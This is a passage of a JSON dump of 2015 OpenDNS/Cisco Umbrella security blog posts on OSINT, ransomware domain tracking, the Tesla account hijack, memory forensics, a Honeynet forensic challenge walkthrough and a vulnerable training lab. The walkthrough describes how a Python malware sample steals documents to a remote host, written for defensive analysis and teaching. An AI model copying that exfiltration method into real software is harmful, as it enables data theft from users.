standalone fashion by sweeping and scrutinizing IP ranges picked up by other models or feeds.", "date": "2015-11-19"},
{"website": "Cisco-Umbrella", "title": "The More You Know: OSINT and Security", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/the-more-you-know-osint-and-security", "abstract": "“Too many people still mistake secrets for intelligence,” says Stephen Mercado, an analyst in the Directorate of Science and Technology at the CIA. OSINT, or open source intelligence , has been both a boon and an Achilles’ heel for intelligence communities for decades. While certain public information may seem harmless, OSINT collected for malicious purposes can prove devastatingly efficient when devising attacks, especially in the hands of an experienced social engineer. OSINT refers to the wide range of information collected from publicly available sources: print and broadcast media, academic texts, and more recently, social media, blogs, forums, and more. In the recent past, OSINT has helped every major world power gather intel on adversaries in conflicts from WWII, to the Korean and Vietnam wars, to the Cold War. Sources have evolved from print publications obtained by foreign agents ( the US aerospace publication Aviation Week — dubbed “Aviation Leak” for its scoops — was a “perennial favorite,” according to Mercado) to radio, and finally to the Internet, today’s unequivocal fire hose of information. The Internet not only provides its own wealth of information, it also makes obtaining other sources of OSINT easier than ever. “During the Second World War, Dr. Fairbank traveled far and at great expense to gather Japanese publications in China and send them to Washington,” writes Mercado. “Today, anyone, anywhere can order Japanese media with a click of the mouse from amazon.co.jp or other online merchants and receive the orders by express air shipment.” But with great ease comes great vulnerability. Attackers who are aiming to break into your network won’t read a few newspaper articles and call it day. Numerous tools freely available on the Internet can assist anyone interested in gathering OSINT. Infosec Institute has a brief list , which includes specific information-gathering tools and data such as Maltego , and WHOIS data , as well as multidisciplinary tools like NewsNow , which are primarily sales and marketing sites. (Another list is available here .) Social engineers in particular are likely to make use of OSINT. Dale Pearson, writing for subliminalhacking.net, comments : “the use of both open source intelligence and acquired information, allows for individuals and groups involved in cyber crime to fuel their knowledge and power influence and manipulate their targets to achieve the required illusion of trust with their target.” He continues, “ The information gathered on a target allows the attacker to create a pretty accurate profile of their target, and potentially of that of their families and friends, as well as their interests both publicly and privately. The aim here is to either act as an individual of trust, or create a pre-text that will be considered trustworthy to aid in achieving their goals.” According to social-engineer.org , “ social engineering is a vector used in [more than] 66 percent of all attacks by hackers, hacktivists, and nation states,” and OSINT enables attackers to be more believable to unsuspecting employees. However, defenders can make use of OSINT as well — to both understand what information is available to attackers, and how to educate employees and users on what information can be safely shared online. CSO Online statistics show that “ the average U.S. company spends $15 million a year battling cybercrime.” Managing OSINT related to your business can help reduce the leverage bad actors have when attempting to infiltrate your networks. OSINT is, according to Arthur Hulnick, a former CIA officer, “neither glamorous nor adventurous.” However, “open sources are nonetheless the basic building block for secret intelligence.” While not the sexiest intel on the market, OSINT can be highly effective for attackers. What constitutes sensitive information is different for everyone, so make sure your security team regularly communicates with employees about posting information in forums or on social media channels, and monitors all channels for sensitive data. Hackers want to infiltrate your castle — don’t make it easier by handing them the keys.", "date": "2015-10-21"},
{"website": "Cisco-Umbrella", "title": "Tracking the Footprints of Ransomware", "author": ["Kevin Bottomley"], "link": "https://umbrella.cisco.com/blog/tracking-the-footprints-of-ransomware", "abstract": "(image courtesy of wuppenif.files.wordpress.com) Ransomware is a form of malware that, once a machine is compromised, starts to seek out certain file extensions, usually Microsoft, AutoCAD, Adobe, or any other file type that might be deemed valuable, and wraps it with an encryption process as to make it unusable by the user until a fee is paid. Currently it seems to be the malware-de-jour. It should be noted that not all ransomware is created equal, nor do they all act in the same way, but they all tend to leave (for the most part) a bit of a footprint that can be used to track and locate where it currently lives on the Internet. Gathering steam a few years ago, ransomware used to work by installing itself, rebooting the system, and displaying an image similar to this one: (image courtesy of bleepingcomputer.com) Scary tactic right? While it might have been frightening to some, all was not really as bad as it appeared to be. It’s unknown how many people actually payed the ransom for this campaign, but one can assume there were quite a few. The simplest way to circumvent this lock down was to boot into safe mode, and clean up the infection using any one of various means. However, as time moved forward, and the income from some of the bigger pharma schemes (real money makers at the time) started to falter, nefarious actors started to work on new and better means to generate revenue. The next real advancement in the ransomware family came in the form of CryptoLocker. CryptoLocker was dispersed through malicious email attachments by the Gameover Zeus (G0Z) botnet and used RSA public-key encryption to make files(both locally and on mapped drives) impossible to use unless a ransom was paid in the form of Bitcoin or pre-paid cards, which usually cost about $300- $500 USD/Euro. CryptoLocker CryptoLocker left a footprint in the way of using a Domain Generated Algorithm (DGA). This DGA was used so that it would produce thousands of domains at a time, with only a couple or so of the domains actually being live. This tactic was used to make locating the Command & Control servers harder for researchers and law enforcement. Yet, once a sample was able to be reversed, and the seed (a seed is what is used to produce the DGA, usually based on a time/date schema) was found, it was easy to determine which domains would be generated in forthcoming days and weeks, and one could block these domains from the network even before they had a chance to become live (something OpenDNS did with great success). With the take down of GoZ in mid-2014, this also helped eradicate CryptoLocker greatly, yet, this would not be the end of ransomware. In all reality, there have been many competitors entering the ring, as well as a couple that have been around for a while. These include: Alpha Crypt Azazel Locker BitCrypt CRYPVAULT CTB-Locker CoinVault CryptoLocker 2.0 CryptoLocker 3.0 CryptoWall CryptoWall 2.0 CryptoWall 3.0 (Cowti) Cryptodefense Harasom.A HowDecrypt (Cryptorbit) PrisonLocker (PowerLocker) Ransomcrypt Reveton Teslacrypt TorrentLocker While some of these used the CryptoLocker name, they were mostly just the same in that way only. Most of these copycat versions used either much weaker encryption processes, or made the mistake of leaving the keys easily recoverable. Yet, for every one that didn’t play up to par, there were a couple that stick out. TorrentLocker This particular ransomware used geo-location based services to target individuals in only a certain parts of the world. While it was seen quite largely in the Australian and New Zealand areas, with some European countries included as well, there was little to no sign of it being used in the United States. The delivery mechanism mostly centered around use of email that referred to messages about unpaid invoices, traffic citations, or missed deliveries. Once opened, there were usually one of two paths taken. There would either be a malicious .zip file attached, or there would be a link to a web site where the user had to complete a captcha. These sites usually were in the form of *(aus|nsw)-(post|gov).(top-level domain) , with some minor variations along the way. This format made the tracking of these domains a bit easier, as just about any domain that was seen in that format proved to be malicious and provided little difficulty in figuring out what the next domains that could prove to be malicious in the future might be. The below screenshot from Investigate shows that database-nsw-gov.net is blocked by OpenDNS. This particular domain was blocked in February of 2015, when it was fairly active, and still shows continued activity today: Tesla/AlphaCrypt This particular variant has a couple of names, but was really the same ransomware, just renamed from TeslaCrypt over to AlphaCrypt. The format AlphaCrypt uses for it’s domains also comes to us in the form of a DGA. An example of the domains tends to look like fsoreij38wje2d.fkos650er4wf[.]com , where there is a both a domain and sub-domain that are both in the form of nonsensical patterns. These tend to be easy to spot using algorithms based on lexical analysis. This particular domain was blocked by OpenDNS back in May of 2015 after being spotted by the aforementioned algorithm. CryptoWall CryptoWall is probably the most formidable runner-up for taking over the legacy CryptoLocker left behind. Unlike CryptoLocker, CryptoWall, and its newer versions 2.0 and 3.0, came out of the gate swinging in late 2014. Also unlike it’s predecessor, CryptoWall did not implement the use of DGA’s, but instead used a combination of compromised sites, TOR (The Onion Router) and I2P (Invisible Internet Project). Throughout the renditions of the malware, it morphed from exploiting the system itself using various vulnerabilities, to employing the use of Exploit Kits, most recently, and noticeably, the use of the Angler Exploit Kit to drop the malware. There are a couple of ways that can be used to track down CryptoWall. Without getting into to much detail, for what I hope are obvious reasons, we can take a look at some of the simpler ones. (CryptoWall decryption instructions. Image courtesy of bleepingcomputer.com) What we can look at first though, is the use of Angler. Angler currently uses an evasion technique where nefarious actors compromise legitimate registrant accounts, and create a rotating set of sub-domains appended to the legitimate domains (2LDs). These sub-domains generally point to a completely different location (IP, ASN, Registrar, etc) that is hosting the Exploit kit landing page. Our research team covered this trend at BSides Raleigh 2013 and wrote a blog with more details in 2014 , and we subsequently discussed this technique at BlackHat , Def Con, and Virus Bulletin of last year. In March of this year, Cisco put out a blog and called the technique ‘Domain Shadowing’. By looking for this Indicators of Compromise, one can start to access which domains have been taken over, and blocked quickly. Yet, one can not rely on the use of Angler alone, albeit a good indicator. CryptoWall tends to make use of compromised domains, and has largely been seen to use outdated WordPress plugins to compromise the legitimate domains (this is not the only way, but is one of the most seen). We can also look for related domains that are associated, that is, domains that are requested in rapid succession to known bad domains, and start to pivot around off of those to find other CryptoWall domains. Attempting to pattern match against requested URL’s is yet another way, but these can change often and rapidly and does not appear to give the same consistent results. The more that malware develops and morphs, the more that detection and prevention has to change. With the high profile of ransomware, and it’s ever continuing transformations, researchers will always be nose to the ground to be out in front of these changes. OpenDNS is committed to this process, and is always striving to improve and revise its procedures and methods to stay one step ahead of these threats.", "date": "2015-08-20"},
{"website": "Cisco-Umbrella", "title": "Five Things To Know About The Tesla Motors Compromise", "author": ["Andrew Hay"], "link": "https://umbrella.cisco.com/blog/five-things-to-know-about-the-tesla-motors-compromise", "abstract": "As many of you have heard, Tesla Motors’ website was “hacked” on Saturday as well as its official Twitter account. The Tesla website was redirected to a server hosted in Amsterdam. Within a few minutes, the account began sending tweets promising free Tesla cars to those who called a certain phone number, which belonged to a computer repair shop in Illinois, and was presumably tweeted out to flood the number’s owner with calls. Later that same day it was revealed that Tesla founder Elon Musk’s Twitter account was compromised. According to Dave Smith at Business Insider “though the parties claiming responsibility offer up different names, it appears to be one coordinated attack on all of Musk’s online and social properties.” Let’s take a deeper dive into what happened. 1) This was not a “hack,” but a series of related defacements We’d first like to communicate that we believe this to be a compromise, and not necessarily a “hack.” This attack (and we use the term loosely) involved the redirecting of legitimate traffic destined for teslamotors.com to an IP address of the attackers’ choosing. Visitors to the domain were presented with the following page (as captured by David Maynor via his Twitter feed): Oh wow…That can’t be good. #tesla #hacked pic.twitter.com/IjASf2ZCw3 — David Maynor (@Dave_Maynor) April 25, 2015 At roughly the same time, the corporate Twitter account for Tesla was compromised. Once controlled by the attackers, several tweets appeared from the @TeslaMotors Twitter account and the name of the account was changed to “#RIPPRGANG.” The account also tweeted the number to call to get a free Tesla. The number was that of a small computer repair shop in Illinois. Elon Musk’s account also began tweeting messages about free cars and where they can be picked up–at the same address in Illinois. 2) The domain registrar may have been socially engineered to give up control of the teslamotors.com domain It appears that very little sophistication was involved in this defacement. As such, there was initial speculation of a social engineering (SE) attack against the domain registrar but sources close to the investigation inform us that the SE attack vector was not exploited. A SE attack against the registrar would explain how the attackers were able to gain access to both the corporate Twitter account and the account of founder Elon Musk. By controlling the domain, and by association the MX (mail exchange) records, the attackers could request a password reset for the Twitter accounts. By controlling the MX record, the e-mailed password resets would have given the attacker control of the social account passwords. The official statement from Tesla, as told to Thomas Fox-Brewster of Forbes , was that “Posing as a Tesla employee, somebody called AT&T customer support and had them forward calls to an illegitimate phone number. The impostor then contacted the domain registrar company that hosts teslamotors.com, Network Solutions. Using the forwarded number, the imposter added a bogus email address to the Tesla domain admin account. The impostor then reset the password of the domain admin account, routed most of the website traffic to a spoof website and temporarily gained access to Tesla’s and Elon’s Twitter accounts.” Tesla’s corporate network, cars, and customer database were not affected and everything has been restored to normal, according to the spokesperson. “We are working with AT&T, Network Solutions, and federal authorities to further investigate and take all necessary actions to make sure this never happens again,” the spokesperson added. So the domain registrar was not SEd, but rather AT&T. This is not the first time that AT&T was tricked into redirecting calls to an illegitimate phone number . 3) DNS shows a timeline of changes during the attack As you can see from OpenDNS Investigate results for teslamotors.com, the domain’s IP address was changed on April 25th from 205.234.27.220 to 4 additional IP addresses not owned or controlled by Tesla. OpenDNS Investigate’s new WHOIS information shows that the domain is back to using UltraDNS for its name servers. The historical (and expected) IP address for teslamotors.com is associated with AS 40913 owned by Quality Technology Services Santa Clara, LLC. This is where the domain is usually hosted. The new IP addresses are shared between hosting providers Digital Ocean (AS 200130), VOXILITY (AS 3223), and OVH (AS 16276). As you can see below, at least 2 of the IP addresses have a questionable track record. 4)  So far, nothing indicates visitors were at risk for malware downloads The teslamotors.com domain received a surge in visits between 04:00 and 07:00 UTC. The most significant spike to the domain occurred on April 26th at 05:00 UTC as shown below. This was likely due to the attackers publicizing the “hack.” The subsequent Internet frenzy to visit the site ensued and was noticed by more than a few individuals. There is no indication of any malware being dropped, nor were visitors redirected to another site to download malware. This can be verified by the HTML dump of the fraudulent site on Pastebin: http://pastebin.com/j6kz0Kdk . 5) The Islamic State of Iraq and ash-Sham (ISIS) was not likely involved, but Lizard Squad may have been? At one point during the campaign, the teslamotors.com site was redirected to another fear-inspiring domain: isis[.]camp. Now http://t.co/Y0Ab1JRkjM points to a domain with ISIS in it. #tesla#hackpic.twitter.com/LHItCZcJbT — David Maynor (@Dave_Maynor) April 25, 2015 The newly created domain was registered at ENom and hosted at DreamHost Web Hosting‎ for a brief time. So was this the work of ISIS? In a word, unlikely. It’s incredibly unlikely that ISIS would have it out for Tesla as a company. It’s even more unlikely that they’d direct their anger at a small Illinois-based computer repair shop. There are speculations around the research community, as well as the targeted individual, that this breach was the work of “Ryan” aka “zeekill” aka “Julius Kivimäki”, a Finish national with alleged ties to Lizard Squad . Receiving reports that Julius Kivimaki hacked Tesla and Elon Musk’s Twitter accounts and websites by Social engineering NetworkSolutions — r000t (@rootworx) April 26, 2015 OpenDNS can neither confirm nor deny attribution at this time. The use of Jihadist-inspired defacements is not new. As many of these defacements are meant to drive traffic to the hijacked site, instill fear, and increase publication int he popular media, the use of controversial (yet unrelated) imagery and messaging is becoming common place.", "date": "2015-04-27"},
{"website": "Cisco-Umbrella", "title": "Finding Malicious Connections within Memory", "author": ["Anthony Kasza"], "link": "https://umbrella.cisco.com/blog/finding-malicious-connections-within-memory", "abstract": "The Importance of Memory Forensics Information security practitioners know the benefits of examining multiple sources of system data. This is one of the corner stones of the SIEM. By accumulating multiple sources of log data a richer and fuller picture can be developed. I like to break down sources of security data into four categories: system state including memory contents, registry entries, logged on users and more system disk including stored files and their locations, system or event logs and more recorded network traffic and network IDS events/alerts and more third party logs from systems providing services such as DHCP, firewall logs, and more Incident response often involves directly investigating a compromised system which typically focuses on the first two above categories. An investigation is typically started when an indicator of compromise is seen associated with a system within a network. Good responders don’t just wait for alerts to come to their inboxes, however. Forensics scanning frameworks are often used, similar to but differently scoped than vulnerability scanners and similar to but broader than antivirus scanners, to identify systems with suspicious configurations or states. As much system data is volatile, many forensics examiners will prefer investigating a “live” system or one that has not ben powered off since the compromise. This is because malware is not running, network connections are not open, and attackers are not logged in when the system is off. All of these indicators can be collected from “live” systems and can be found within the system’s memory. Analyzing the memory of a system is most fruitful for determining current system state. An Open Source Memory Analysis Framework Enter Rekall, a cross platform open source framework for analyzing system memory (from both “live” systems and memory dumps). Written in Python, Rekall came out of  branch of the Volatility project. It scans system memory for specific kernel structures and parses them. Structures include: system registry running processes open network sockets arp table entries mounted disks It is incorporated into Google Rapid Response (GRR) a framework for deploying scalable forensics scanning of  large environments. Rekall has an extensible plugin architecture and comes with many useful plugins including Yara scanning of memory. The plugin architecture also allows for custom plugins. Investigate Your Memory One plugin that grabbed my interests was the dns_cache plugin for Windows systems. It scans the memory image loaded into Rekall for Microsoft’s dnsrslvr.dll library which is loaded by the svchost process. This DLL provides the DNS Caching Resolver Service which acts as a local DNS cache for the operating system. I added some logic to this dns_cache plugin to allow Rekall to send the domain names identified in the system’s DNS cache to OpenDNS’s Investigate API and display the categorization of the domain name from within Rekall. To use this new functionality download this fork of Rekall, drop in an Investigate API key, and install Rekall. For capturing an image of live memory from a running system, you’ll also need the winpmem kernel driver for accessing physical memory as a file (the SANS Internet Storm Center has a nice write up about it here ). Happy hunting!", "date": "2015-04-09"},
{"website": "Cisco-Umbrella", "title": "Solving the Honeynet Forensic Challenge – \"Weird Python\"", "author": ["Anthony Kasza"], "link": "https://umbrella.cisco.com/blog/honeynet-weird-python", "abstract": "Two weeks ago I saw on Twitter that Thomas Chopitea and Maximilian Hils of The Honeynet Project were nice enough to create an online forensics challenge. I had a Sunday afternoon free and thought I’d give it a shot. I ended up completing most of the challenge. This blog serves as a walk through for my solution. Network Forensics I’ve talked about my approach to network forensics before and thought, “what better time to practice what I preach?”. First I read over the challenge page including each question to gather as much contextual information as possible. I made note of the superheroes bonus question and kept it in the back of my head while working through the artifacts. The challenge provided a network trace file and a back story. The important details of the story were: John is your boss and his system was compromised at a BYOD conference Pete Galloway responded to the compromise and then angrily quit the company Pete found malware, Python bytecode, and “random” payloads during his triage The first thing I typically do when analyzing network traffic is check the size of the trace file. If I can reasonably open it with Wireshark, I will. I like to use Wireshark to check two things about the trace file. The first is the number of connections broken down by protocol, which can be found by going to Statistics->Conversations. We can see about 150 TCP connections and 100 UDP connections. The second thing is the protocols Wireshark thinks the trace contains. This can be accomplished by going to Statistics->Protocol Hierarchy. We can see most of the UDP is DNS making most of those 100 UDP connection fairly easy to understand. It should be noted that Wireshark determines the protocols by port number. This is a rather naive method and Wireshark’s listing should be taken with a grain of salt. Wireshark is a great tool for visually working with a relatively small number of streams, but I much prefer Bro . Bro isn’t as simple to use as Wireshark, though. To get a full picture of the trace file’s contents I read the trace file with Bro and told Bro to use a custom configuration. I started by copying broctl’s default configuration file from %BRO_DIR%/bro/share/bro/site/local.bro. I enabled and disabled certain features and added an event handler for carving transferred files from the trace (and naming them with the protocol they were transferred over) and I set my local subnets to 0.0.0.0/0 (doing so makes Bro create additional log lines for every IP address in the trace file). Once finished the contents of my local.bro script looked like this: @load misc/loaded-scripts @load tuning/defaults @load misc/scan @load misc/app-stats @load misc/detect-traceroute @load frameworks/software/vulnerable @load frameworks/software/version-changes @load-sigs frameworks/signatures/detect-windows-shells @load protocols/ftp/software @load protocols/smtp/software @load protocols/ssh/software @load protocols/http/software @load protocols/dns/detect-external-names @load protocols/ftp/detect @load protocols/conn/known-hosts @load protocols/conn/known-services @load protocols/ssl/known-certs @load protocols/ssl/validate-certs @load protocols/ssl/log-hostcerts-only @load protocols/ssh/geo-data @load protocols/ssh/detect-bruteforcing @load protocols/ssh/interesting-hostnames @load protocols/http/detect-sqli @load frameworks/files/hash-all-files export { redef Site::local_nets += [0.0.0.0/0]; } event file_new(f: fa_file) { local fname = fmt(\"%s_%s\", f$source, f$id); Files::add_analyzer(f, Files::ANALYZER_EXTRACT, [$extract_filename=fname]); } I then ran bro -Cr conference.pcapng local.bro and Bro generated a plethora of useful information I used as my inventory. The log files Bro generated for me where: app_stats.log dns.log files.log known_certs.log known_services.log packet_filter.log ssl.log x509.log conn.log http.log known_hosts.log loaded_scripts.log notice.log software.log weird.log Bro also extracted all the files transfered within the trace file and dropped them into a directory for me which I named extract_files/. With my Bro logs as my inventory, I first checked the conn.log file to get an overview of the connections in the trace file. Looking at the “service” field in the conn log as well as the name of the log files Bro created, we can see the trace file contains mostly HTTP and DNS traffic. It’s likely just web browsing. Looking in the dns.log file, you can see all the domain names queried for in the trace file and looking in the http.log file, you can see all the hosts and URLs John browsed to. Looking at the extracted files in extract_files/ whose names begin with “HTTP_” you can see all the HTML, javascript, and images transferred to and from on John’s system. Using the http and dns logs and the extracted files, we can answer the first question, “BYOD seems to be a very interesting topic. What did your boss do during the conference?”. It seems John got on Facebook, Reddit, Gag9, and browsed to “www.thewayoftheninja.org” quite a bit during the conference. He was likely very productive. Looking closer at the http.log file, we can see “http://www.thewayoftheninja.org/n.html” was used as a referer in one HTTP connection, meaning John was likely redirected or linked there from “http://www.thewayoftheninja.org/n.html”. The host field for the connection is “www.harveycartel.org” and the file path John went to was “/nv2/Nv2-PC.zip”. This is interesting because it is supposedly a zip file. It is also interesting because about a minute after the zip file was downloaded an HTTP connection to “ninja-game.org” was made using a user-agent of “Python-urllib/2.7”. Recall Pete mentioned some interesting Python bytecode. Looking at the URL of the other connections made to “ninja-game.org”, we can see Windows file paths. This is very strange. You can also see the user-agent used in connections to “ninja-game.org” is “Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36”, a Mac user-agent while all the previous HTTP connections used “Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36 “, a Windows user-agent. This lead me to believe the user-agent was crafted, likely by malware, likely inside that Zip file. The next thing I did was check the mime types of all the files transferred in the trace file. I opened up the files.log file and noted an “application/x-dosexec” and an “application/x-shockwave-flash” file. These are both common file types often used in attacks so I honed in on them, especially the DOS executable file. But what happened to the Zip file? Bro and libmagic (the file command in Linux) both claim the file at “/nv2/Nv2-PC.zip” is an EXE even though the URL contained a Zip extension. I looked at the file with ExeInfo and  the Zip file turned out to be a self extracting archive. At this point, we can answer the second question, “What method did the attacker use to infect your boss? Which systems (i.e. IP addresses) are involved?”. The attacker served back a malicious Zip file disguised as a game and John, working so diligently at his conference, ran it on his system. The file was served from 81.166.122.238, the same IP address the malware later in the trace file beacons to. We can also answer the third question, “Based on the PCAP, which files were exfiltrated? List the filenames.”. From the URLs in our http.log file: C:UsersadminDesktopsensitive+documents.doc C:UsersadminDesktopToolsodbg201help.pdf C:UsersadminDocumentsprivateaffairholidayEmiratesETicket1.pdf C:UsersadminDocumentsprivateaffairholidayEmiratesETicket2.pdf Based on the time the HTTP connections began we can answer question four, “Can you sketch an overview of the general actions performed by the malware?”. It seems John downloaded what he thought was just a game. Likely opened the file and ran some malware. John’s system issued a GET request for “ninja-game.org/highscores?user=admin”, likely downloaded a configuration or instructions file and then exfiltrated the above files from John’s system. Host Forensics and Malware Analysis This is where network forensics ends and malware analysis/host forensics is needed. Moving the self extracting Zip to a previously configured malware analysis VM and opening it with 7zip, we can see the archive contains five files and a directory. main.exe main.pyc n_v14.exe python27.dll start.cmd lib/ Opening start.cmd with Notepad we can see how the malware is started. It seems n_v14.exe is the game John was hoping to play while main.exe is the malware. I began by examining main.pyc. Python compiles scripts before running them and stores the compiled version in pyc files. Similar to .NET assemblies, Python bytecode can be decompiled to the original source code quite easily. Using a library called Uncompyle , I decompiled the pyc file. It contained the following: import sys sys.exit('rndebugger detected.rnsignature:233f3f3b7164642c2424652c276431723a7d021e') which answers the seventh question, “What does main.pyc do? (Bonus: Can you provide a decompiled version?)”. This makes me believe the main.exe file incorporates some anti debugging techniques. Looking at the strings in main.exe, we can see some references to Python including “Py_SetPythonHome”, “Could not load Python.”, and “import main”. This makes me believe main.exe was originally written in Python and made into an EXE file with something similar to py2exe . It is likely main.pyc is a remnant of main.exe. This answers question six, “The malware seems to be written in Python. Is this “normal” Python? What’s different?” and also explains the Python user-agent we saw in the trace file. Opening main.exe in the freeware version of IDA and pressing Ctrl-E to locate the entry point, we see IDA found some TLS call backs in main.exe. These are likely used to detect the presence of debuggers. This was my somewhat thin answer to question eight, “How is the final payload protected? How is it decrypted by the dropper? (Bonus: Can you provide a decompiled version?)” as I didn’t completely reverse engineer main.exe. Instead, I treated main.exe as a blackbox. I executed main.exe with Fakenet running on my VM to attempt to recreate what happened on John’s system. My VM issued the same GET request I saw in the trace file to “ninja-game.org/highscores?user=admin”, except admin was replaced with the user account I was logged in as on my VM. Fakenet responded with its default HTML file. I was hoping to see POST requests exfiltrating data from my VM similar to the conference trace, but the malware issued no other network connections. I then replaced Fakenet’s default HTML file (which it serves to all requests by default) with the file the live server from the conference trace file responded to John’s system with and executed main.exe. Again, I saw the GET request to “ninja-game.org/highscores?user=[USER_NAME]”, but this time I also saw POST requests to “ninja-game.org/submit_highscore?n=[FILE_PATH]” where the full path to some PDFs on my desktop replace [FILE_PATH]. I then carved the data the malware POSTed to Fakenet and compared the original PDFs on my desktop to the exfiltrated data in the malware’s POST request. The size of the two files were the same. I assumed the file was either encoded or encrypted. Comparing the contents of the two files in HxD, I noticed that all 0x20 bytes in the original document mapped to 0x6F. I checked other bytes from the original PDF and they seemed to all be substituted in the encoded version. Decoding John’s Exfiltrated Files I assumed the encoded file was simply an xOR’d version of the original PDF and tried decoding the encoded version with 0x4F (0x20 ^ 0x6F), but found that xOR key wasn’t used to encode all bytes of the original file. I was a little stumped at this point. I considered other simple methods of encoding including: a caesarian shift a modulus function that depended on the input byte a hard coded substitution scheme The solution then came to me. As I said previously, I treated main.exe as a blackbox and didn’t worry about the actual encoding functionality within main.exe. Using some basic Python I crafted a fake PDF and placed it on my desktop for the malware to steal and POST. My Python script follows: with open('./crafted.pdf', 'wb') as f: for each in range(0xff + 1): f.write(\"%c\" % each) This creates a file with bytes 0x00 through 0xFF and names it with a PDF extension. I then started Fakenet and again executed main.exe. The malware issued a GET request for “ninja-game.org/highscores?user=[USER_NAME]”, Fakenet served back the original server’s response, the malware found the crafted PDF on my desktop, encoded it and included it in a POST body which was intercepted by Fakenet. Carving the encoded file POST’d by the malware from a PCAP Fakenet wrote for me, I had a copy of every byte 0x00 through 0xFF and that byte’s corresponding encoded version. I then used more Python scripting to construct a dictionary mapping encoded bytes to decoded bytes and used that dictionary to decode the encoded PDF and DOC files exfiltrated from John’s system and carved from the conference.pcapng file. The decoding script follows: # This builds the decoding dictionary from the encoded crafted PDF d = {} count = 0x00 byte = 'x01' with open('./crafted_ecoded.pdf', 'rb') as f: while byte != \"\": byte = f.read(1) if byte == \"\": continue foo = ord(byte) d[foo] = count count += 1 # This decodes the a single file carved from the malware's POST requests in the original challenge pcap byte = 1 with open('./doc_encoded.doc', 'rb') as en: with open('./doc_decoded.doc', 'wb') as de: while byte != \"\": byte = en.read(1) if byte == \"\": continue foo = d[ord(byte)] de.write(\"%c\" % foo) After decoding John’s PDFs and DOC files, I opened them. The PDFs contained plane tickets to Dubai in John’s and Pete’s wife’s name. This is likely why Pete was so mad and quit the company. This was the answer to question nine, “Why did Pete leave the company?”. The answer to question ten, “Your boss mentioned he’s going to the Honeynet Workshop in Stavanger, but you’re not allowed to join him. Why so?” was also in the PDFs. The reservations for Dubai are for the same date as the Honeynet Workshop. Interestingly enough, John was likely already compromised before this incident as the word document on his desktop contained a malicious macro which dropped this EXE in his TEMP folder. Considering the bonus question, the only super heros I found were in images extracted from John’s browsing. Finally, the somewhat subjective question five, “Do you think this is a targeted or an automated attack? Why?” can be answered. I believe the attack to be automated and not targeted. The malware seems to grab any PDF or DOC file on the Desktop or in the user’s documents folder in alphabetical order (I noticed this when it exfiltrated a temporary file I created, “a_crafted.pdf”, before “crafted.pdf”. The malware isn’t looking for anything specific besides files with specific extensions. The malware is not targeting John’s files specifically. However, depending on how the attacker delivered the malware and whether or not the malware was delivered to anyone else at the conference, the attacker *could have* been targeting John. Final Thoughts I had a lot of fun working this challenge and I learned quite a bit about EXE files generated from Python and thread-local storage techniques. I’m always looking for opportunities to use Bro, as well, and this was a good one. I want to thank Thomas and Maximilian for putting the challenge materials together as well as the Honeynet Project. If anyone else found the superheros, I’d love to here where.", "date": "2015-04-07"},
{"website": "Cisco-Umbrella", "title": "Security Ninjas: An Open Source Application Security Training Program", "author": ["OpenDNS Engineering"], "link": "https://umbrella.cisco.com/blog/security-ninjas-an-open-source-application-security-training-program", "abstract": "Security Ninjas In order for OpenDNS to be able to make the internet secure, we need to make sure OpenDNS itself is secure. On the Application Security front, apart from performing security reviews, we also conduct internal security awareness and training exercises. What Is the Security Ninjas Program? Security Ninjas is an Application Security Training Program that I created for our software developers here at OpenDNS. It has really helped our developers write more secure code and hence reduced the burden on our security team, so we thought open sourcing it for the benefit of the community. The training program slide deck covers the OWASP Top 10 (2013) vulnerabilities and some general security best practices. The hands-on training lab consists of 10 fun real world like hacking exercises, corresponding to each of the OWASP Top 10 vulnerabilities. Hints and solutions are provided along the way. Although the backend for this is written in PHP, vulnerabilities would remain the same across all web based languages, so the training would still be relevant even if you don’t actively code in PHP. Just a heads up on the timeline (in case you are presenting it): talking through the slides along with hacking the lab takes ~2 hrs. Why Is Application Security Training Important? It’s hard to scale the Security Engineering team with the Software Development teams. It’s practically impossible for the security team to review each line of code before it goes in production. It’s best to train developers so that they are not only able to catch security bugs during peer reviews, but also avoid writing vulnerable code in the first place. This approach scales well with fast dev cycles. This sort of proactive approach also reduces the amount of work that needs to be put in reactively—both by the security team during reviews and by the dev teams while fixing bugs. Meaning? Less friction and faster code deployment! This knowledge also helps developers understand security issues, risks and consequences faster especially when security bugs are reported. Last but not the least it makes developers unconsciously care/informed about security. Making the Hands-on Lab Work: Docker instructions I would highly recommend that you run the training in a docker container because of the following: Setting up and destroying the environment would be super easy and quick. The docker container would be sandboxed which means that the vulnerable application wouldn’t be able to harm the host OS. Setup: Setup docker https://docs.docker.com/get-docker/ . There are many ways to do this depending on the OS you use. Make sure docker has been installed correctly by running ‘docker version’. Start the Application Security Training container by running the following command (I chose port 8899 to avoid port allocation conflicts): ‘docker run -d -p 8899:80 opendns/security-ninjas’. Get the IP address of your container. In my case the command was ‘boot2docker ip’ as I was running docker using boot2docker. Go to your web browser and enter <IP address from step 4>:8899. The training should be running now and you should see the home page in your browser window. Kill the container after you are done. Go back to the terminal and type ‘docker ps’. Get the container id of the training. Then run ‘docker kill {container id}’. Running it using a web server If for some reason you are not able to run the training in a docker container, you may also run it using a web server. Download a web server (like Apache) and PHP. Download the source code from here and put it in the directory where the web server looks for files to serve. In the Security Ninjas sub-directory, change text file permissions: ‘chmod 777 *.txt’ Make sure WHOIS is installed on the web server. Start the web server and reach the application from your web browser. The following steps are optional but recommended (for both Docker and web server): Install Firefox. Install the FoxyProxy plugin for Firefox In select mode: Use proxy “Default” for all URLs. Configure the Default proxy to use 127.0.0.1:8080. You can delete or disable this plugin after the exercise. Install Burp Suite free from https://portswigger.net/burp . You could use some other proxy tool as well. You can get some basic Burp Suite tutorials from https://portswigger.net/support . You can turn the proxy off for most of the exercises but for some, having the intercept on would make it much easier to inspect and alter the HTTP requests. Run the training in Firefox.", "date": "2015-03-16"},
